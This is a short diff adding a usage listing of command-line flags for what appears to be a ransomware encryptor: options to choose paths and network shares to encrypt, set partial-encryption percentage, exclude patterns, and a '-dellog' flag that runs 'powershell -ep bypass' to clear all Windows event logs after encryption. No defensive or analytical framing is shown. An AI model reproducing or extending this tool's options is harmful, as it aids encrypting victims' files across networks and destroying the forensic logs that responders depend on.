@@ -1,0 +1,7 @@
+-p / --encryption_path   Path(s) to encrypt
+-s / --share_file        File listing network shares
+-n / --encryption_percent  Partial encrypt percent (default 50)
+-l                       List drives then exit (no encrypt)
+-localonly               Local disks only (skip network)
+-e / --exclude           Extra exclude pattern (regex)
+-dellog                  After encrypt: powershell -ep bypass ClearLog all event logs
